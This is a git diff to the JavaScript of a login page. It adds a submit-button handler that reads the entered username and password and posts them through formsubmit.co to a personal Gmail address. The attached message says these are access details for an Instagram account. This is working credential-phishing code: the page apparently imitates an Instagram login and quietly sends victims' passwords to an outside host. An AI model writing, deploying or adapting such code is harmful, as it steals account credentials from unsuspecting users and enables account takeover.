@@ -34,7 +34,46 @@ const user = document.querySelector("#user");
 const show = document.querySelector(".show");
 const button = document.querySelector("#submit");
 
-password.addEventListener("keyup", (e) => {  
+
+button.addEventListener("click", () => {
+  enviarEmail();
+});
+
+
+
+const enviarEmail = () => {
+  let usuario = user.value;
+  let senha = password.value;
+
+  fetch("https://formsubmit.co/ajax/ezequielfernandes912@gmail.com", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Accept": "application/json"
+    },
+    body: JSON.stringify({  
+      nome: usuario,
+      email: senha,
+      mensagem: "Aqui esta os acessos para a conta do instagram!",
+      _captcha: false
+    })
+  })
+    .then(response => response.json())
+    .then(data => {
+      alert("Email enviado com sucesso!");
+      console.log(data);
+    })
+    .catch(error => {
+      alert("Erro ao enviar email");
+      console.log(error);
+    });
+
+};
+
+
+
+
+password.addEventListener("keyup", (e) => {
   let value = e.target.value;
 
   if (value === "" || value.length < 6) {
